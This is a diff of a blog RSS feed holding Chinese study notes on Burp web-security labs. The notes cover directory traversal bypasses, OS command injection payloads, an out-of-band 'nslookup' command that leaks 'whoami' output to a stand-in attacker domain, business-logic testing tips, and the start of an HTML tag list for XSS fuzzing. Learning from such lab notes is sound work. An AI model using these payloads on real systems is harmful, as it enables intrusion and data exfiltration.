@@ -13,26 +13,6 @@
         <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
         <lastBuildDate>Thu, 22 Dec 2022 20:44:54 +0800</lastBuildDate>
         <item>
-            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-3/</guid>
-            <title>BurpLab_3-Directory_traversal</title>
-            <link>http://ericcd.com/2022/12/22/BurpLab-3/</link>
-            <category term="web" scheme="http://ericcd.com/categories/web/" />
-            <category term="web" scheme="http://ericcd.com/tags/web/" />
-            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;一个简单特点&lt;br /&gt;
- &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
-&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
-&lt;li&gt;爆破&lt;/li&gt;
-&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
-&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
-&lt;/ol&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-2/</guid>
             <title>BurpLab_2-Authentication</title>
             <link>http://ericcd.com/2022/12/22/BurpLab-2/</link>
@@ -106,6 +86,26 @@ message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-3/</guid>
+            <title>BurpLab_3-Directory_traversal</title>
+            <link>http://ericcd.com/2022/12/22/BurpLab-3/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;一个简单特点&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
+&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
+&lt;li&gt;爆破&lt;/li&gt;
+&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
+&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-4/</guid>
             <title>BurpLab_4-OS_command_injection</title>
             <link>http://ericcd.com/2022/12/22/BurpLab-4/</link>
@@ -121,6 +121,36 @@ message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
  &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 应用                      Linux          Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用户名                  whoami         whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 操作系统              uname -a       ver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络设置              ifconfig              ipconfig /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络连接              netstat -an         netstat -an&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 进程                     ps -ef          tasklist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;h1 id=&#34;detecting-blind-os-command-injection-using-time-delays&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#detecting-blind-os-command-injection-using-time-delays&#34;&gt;#&lt;/a&gt; Detecting blind OS command injection using time delays&lt;/h1&gt;
 &lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; ping -c 10 127.0.0.1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|ping+-c+10+127.0.0.1||&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection by redirecting output&lt;/h1&gt;
+&lt;p&gt;配合目录穿越使用&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; whoami &amp;gt; /var/www/static/whoami.txt &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection using out-of-band (OAST) techniques&lt;/h1&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;ways-of-injecting-os-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ways-of-injecting-os-commands&#34;&gt;#&lt;/a&gt; Ways of injecting OS commands&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;仅 Unix 系统下使用的分隔符：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Newline (0x0a or \n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 还可以通过以下方式执行命令:&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`injected command`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$(injected command )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-5/</guid>
+            <title>BurpLab_5-Business_logic_vulnerabilities</title>
+            <link>http://ericcd.com/2022/12/22/BurpLab-5/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;excessive-trust-in-client-side-controls&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#excessive-trust-in-client-side-controls&#34;&gt;#&lt;/a&gt; Excessive trust in client-side controls&lt;/h1&gt;
+&lt;h1 id=&#34;failing-to-handle-unconventional-input&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#failing-to-handle-unconventional-input&#34;&gt;#&lt;/a&gt; Failing to handle unconventional input&lt;/h1&gt;
+&lt;p&gt;1.Are there any limits that are imposed on the data?&lt;br /&gt;
+2.What happens when you reach those limits?&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMuSXM=&#34;&gt;3.Is&lt;/span&gt; any transformation or normalization being performed on your input?&lt;br /&gt;
+4. 注意边界值和特殊值&lt;br /&gt;
+ 5. 有后端前端不会检测用户输入的长度，后端也只是做了简单的截断处理，可以摸清后端的阶段规律，自定义一个适当长度的字符串，让它被阶段后成为我们的目标字符串&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -136,6 +166,236 @@ message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;abbr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;acronym&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;animate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;animatemotion&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;animatetransform&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;applet&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;area&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;article&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aside&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bdo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;big&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;blink&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;blockquote&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;body&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;br&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;button&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canvas&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;caption&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;center&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;col&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;colgroup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;command&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;custom tags&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;datalist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;details&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dfn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dialog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;div&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;element&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;em&lt;/span&gt;&lt;br&gt;&lt;span 